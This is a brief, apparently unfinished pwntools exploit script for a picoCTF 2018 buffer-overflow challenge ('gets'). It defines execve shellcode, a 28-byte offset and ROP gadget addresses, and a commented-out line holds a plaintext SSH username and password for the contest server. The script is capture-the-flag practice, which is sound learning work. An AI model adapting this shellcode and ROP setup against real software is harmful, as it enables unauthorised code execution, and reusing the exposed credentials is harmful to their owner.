from pwn import *
import math
context(terminal = ['terminator', '-x', 'sh', '-c'], os = 'linux', log_level = 'debug')
# s = ssh(host='2018shell1.picoctf.com',user='dr3dd',password='yoyoman12345')
# p = s.process('/problems/can-you-gets-me_2_da0270478f868f229487e59ee4a8cf40/gets')
shellcode = "\x31\xc0\x50\x68\x2f\x61\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x8d\x54\x24\x08\x50\x53\x8d\x0c\x24\xb0\x0b\xcd\x80\x31\xc0\xb0\x01\xcd\x80"

p  = process('./gets')
elf = ELF('./gets')
bss = elf.bss()

main=elf.symbols['main']
read = 0x806d5f0
write_plt = 0x806d660

offset = 28
pppr = 0x080483c8
ppr = 0x0804847f
pr = 0x08048433


# p.recv(1024)
# p.sendline('A'*offset)
# p.interactive()
